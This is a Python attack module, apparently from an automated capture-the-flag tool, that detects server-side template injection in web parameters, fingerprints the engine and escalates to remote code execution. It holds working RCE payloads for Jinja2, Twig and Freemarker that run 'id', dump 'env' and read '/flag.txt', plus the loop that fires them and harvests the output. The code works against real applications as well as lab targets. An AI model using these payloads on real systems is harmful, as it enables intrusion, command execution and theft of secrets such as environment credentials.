"""
Server-Side Template Injection attack module.
Fingerprints engine first, then escalates to RCE.
"""
from __future__ import annotations
from attacks.base import BaseAttack
from engine.flag_hunter import has_definite_flag
from rich.console import Console

console = Console(legacy_windows=False)

SSTI_PARAM_HINTS = [
    "name", "greeting", "message", "template", "render", "view",
    "subject", "body", "content", "title", "query", "search", "q",
    "tpl", "tmpl", "expr", "html", "output", "layout",
    "format", "text", "markup", "snippet", "code",
]

# Use large multiplication results (99980001) to avoid false positives:
# small numbers like 49 commonly appear in HTML (CSS values, counts, etc.)
DETECTION_PAYLOADS = [
    ("{{7*'7'}}", "7777777"),           # Jinja2: string multiply — most unique
    ("{{9999*9999}}", "99980001"),      # Jinja2 / Twig
    ("${9999*9999}", "99980001"),       # Freemarker / Mako / Velocity
    ("#{9999*9999}", "99980001"),       # Groovy
    ("<%= 9999*9999 %>", "99980001"),  # ERB
    ("{9999*9999}", "99980001"),        # Smarty
    ("${{9999*9999}}", "99980001"),
]

ENGINE_FINGERPRINTS = {
    "Jinja2": ["{{7*'7'}}", "7777777"],
    "Twig": ["{{9999*9999}}", "99980001"],
    "Freemarker": ["${9999*9999}", "99980001"],
    "Velocity": ["#{9999*9999}", "99980001"],
    "ERB": ["<%= 9999*9999 %>", "99980001"],
    "Smarty": ["{9999*9999}", "99980001"],
    "Mako": ["${9999*9999}", "99980001"],
}

RCE_PAYLOADS = {
    "Jinja2": [
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}",
        "{{request.__class__._load_form_data.__globals__['os'].popen('cat /flag.txt').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[408]('cat /flag.txt',shell=True,stdout=-1).communicate()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('env').read()}}",
    ],
    "Twig": [
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        "{{['cat /flag.txt']|filter('system')}}",
    ],
    "Freemarker": [
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"cat /flag.txt\")}",
    ],
}


class SSTIAttack(BaseAttack):
    name = "ssti"

    async def run(self, attack_point: dict, payloads: list[str]) -> list[dict]:
        url = attack_point["url"]
        param = attack_point.get("param", "")
        method = attack_point.get("method", "GET")

        if not param or not any(hint in param.lower() for hint in SSTI_PARAM_HINTS):
            return []

        console.print(f"  [cyan][SSTI][/cyan] {method} {url} ?{param}")
        all_findings = []

        detected_engine = None
        for payload, expected in DETECTION_PAYLOADS:
            if self._should_stop():
                break
            response, _ = await self._try_payload(method, url, param, payload)
            if response and expected in response.text:
                console.print(
                    f"  [bold red][SSTI][/bold red] Template expression evaluated! "
                    f"Payload: {payload!r} → found {expected!r}"
                )
                all_findings.append({
                    "type": "ssti_detected",
                    "value": f"SSTI @ {url} param={param} payload={payload!r}",
                    "confidence": 0.9,
                })
                for engine, (eng_payload, eng_expected) in ENGINE_FINGERPRINTS.items():
                    if payload == eng_payload and expected == eng_expected:
                        detected_engine = engine
                        break
                if not detected_engine:
                    detected_engine = "Jinja2"
                break

        if detected_engine and detected_engine in RCE_PAYLOADS:
            console.print(f"  [yellow][SSTI][/yellow] Trying RCE with {detected_engine}...")
            for rce_payload in RCE_PAYLOADS[detected_engine]:
                if self._should_stop():
                    break
                response, findings = await self._try_payload(method, url, param, rce_payload)
                if response and len(response.text) > 10:
                    if any(cmd_hint in response.text for cmd_hint in ["uid=", "root", "flag", "FLAG"]):
                        console.print(
                            f"  [bold red][SSTI RCE][/bold red] Command output: "
                            f"{response.text[:300]!r}"
                        )
                        findings.append({
                            "type": "ssti_rce",
                            "value": f"SSTI RCE ({detected_engine}) output: {response.text[:300]}",
                            "confidence": 0.95,
                        })
                        all_findings.extend(findings)
                        flag = has_definite_flag(findings)
                        if flag:
                            console.print(f"  [bold green][SSTI][/bold green] FLAG: {flag}")
                            self.stop_event.set()
                            return all_findings

        # Extra skill/file payloads: information gathering ({{config}}, {{self}}, etc.)
        # Only run if SSTI already confirmed, to avoid false positives
        if detected_engine and payloads:
            already_tried = {p for p, _ in DETECTION_PAYLOADS}
            for extra in payloads:
                if self._should_stop():
                    break
                if extra in already_tried:
                    continue
                response, findings = await self._try_payload(method, url, param, extra)
                if response and findings:
                    all_findings.extend(findings)
                    flag = has_definite_flag(findings)
                    if flag:
                        console.print(f"  [bold green][SSTI][/bold green] FLAG: {flag}")
                        self.stop_event.set()
                        return all_findings

        return all_findings
